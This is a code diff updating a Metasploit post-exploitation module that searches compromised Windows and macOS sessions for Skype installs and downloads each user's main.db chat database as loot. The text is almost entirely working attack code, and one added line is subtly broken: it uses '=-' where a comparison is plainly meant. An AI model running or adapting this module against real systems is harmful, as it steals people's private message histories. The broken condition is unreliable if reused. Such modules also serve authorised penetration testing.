@@ -1,24 +1,14 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'csv'
 
-
-
-
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
-
   include Msf::Post::OSX::System
-
-
 
   def initialize(info={})
     super( update_info( info,
@@ -36,7 +26,7 @@ class Metasploit3 < Msf::Post
       [
         # Set as an advanced option since it can only be useful in shell sessions.
         OptInt.new('TIMEOUT', [true ,'Timeout in seconds when downloading main.db on a shell session.', 90]),
-      ], self.class)
+      ])
   end
 
   # Run Method for when run command is issued
@@ -52,9 +42,9 @@ class Metasploit3 < Msf::Post
       return
     end
 
-      if (session.platform =~ /java/) || (session.platform =~ /osx/)
-        # Make sure a Java Meterpreter on anything but OSX will exit
-        if session.platform =~ /java/ and sysinfo['OS'] !~ /Mac OS X/
+      if session.platform =~ /java/
+        # Make sure that Java Meterpreter on anything but OSX will exit
+        if session.platform !~ /osx/
           print_error("This session type and platform are not supported.")
           return
         end
@@ -68,7 +58,7 @@ class Metasploit3 < Msf::Post
             process_db(db_in_loot,p['name'])
           end
         end
-      elsif (session.platform =~ /win/ and session.type =~ /meter/)
+      elsif (session.platform =- 'windows' and session.type == 'meterpreter')
         # Iterate thru each user profile in a Windows System using Meterpreter Post API
         grab_user_profiles().each do |p|
           if check_skype(p['AppData'],p['UserName'])
@@ -85,7 +75,7 @@ class Metasploit3 < Msf::Post
   # Check if Skype is installed. Returns true or false.
   def check_skype(path, user)
     dirs = []
-    if session.type =~ /meterpreter/
+    if session.type == 'meterpreter'
       session.fs.dir.foreach(path) do |d|
         dirs << d
       end
@@ -104,8 +94,8 @@ class Metasploit3 < Msf::Post
 
   # Download file using Meterpreter functionality and returns path in loot for the file
   def download_db(profile)
-    if session.type =~ /meterpreter/
-      if sysinfo['OS'] =~ /Mac OS X/
+    if session.type == 'meterpreter'
+      if session.platform == 'osx'
         file = session.fs.file.search("#{profile['dir']}/Library/Application Support/Skype/","main.db",true)
       else
         file = session.fs.file.search("#{profile['AppData']}\\Skype","main.db",true)
@@ -122,7 +112,7 @@ class Metasploit3 < Msf::Post
       )
 
     file.each do |db|
-      if session.type =~ /meterpreter/
+      if session.type == 'meterpreter'
         maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
         print_status("Downloading #{maindb}")
         session.fs.file.download_file(file_loc,maindb)
